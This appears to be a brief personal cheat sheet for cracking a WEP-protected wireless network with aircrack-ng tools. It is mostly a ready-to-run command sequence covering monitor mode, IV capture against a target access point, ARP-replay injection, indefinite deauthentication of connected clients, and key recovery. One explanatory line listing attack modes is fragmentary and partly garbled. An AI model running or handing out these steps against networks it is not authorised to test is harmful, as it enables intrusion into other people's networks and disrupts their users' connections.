# WEP IV Attack
Collect enough IVs. In airodump, the `#Data` column = unique IV count. Capture until it's high, then let aircrack recover the key statistically (no wordlist)
> (`-1` fake-auth, `-3` ARP-replay, `-4` chopchop, `-5` frag) but only `-0` (deauth) and `-9` (injection test)

## Steps
```sh
$ sudo airmon-ng check kill
$ sudo airmon-ng start wlan0 3
$ sudo airodump-ng wlan0mon
$ sudo airodump-ng -c 3 --bssid <BSSID> -w wep wlan0mon   # need #Data at tens of thousands
# If Data does not go up try ARP request replays
$ sudo aireplay-ng -3 -b <BSSID> -h <MAC> wlan0mon
# OR try deauth
$ sudo aireplay-ng -0 0 -a <BSSID> wlan0mon
$ aircrack-ng wep-01.cap
$ sudo airmon-ng stop wlan0mon
```
